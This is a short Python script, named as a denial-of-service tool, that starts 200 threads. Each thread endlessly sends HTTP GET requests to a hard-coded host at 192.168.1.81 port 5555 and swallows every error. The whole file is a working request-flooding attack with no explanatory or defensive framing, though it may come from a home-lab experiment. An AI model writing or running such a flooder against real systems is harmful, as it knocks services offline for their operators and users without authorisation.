import threading, requests


def request_dos():
    while True:
        try:
            requests.get("http://192.168.1.81:5555")
        except:
            pass

threads = []


for _ in range(200):
    t = threading.Thread(target=request_dos)
    threads.append(t)
    t.start()
    print("adding threads")

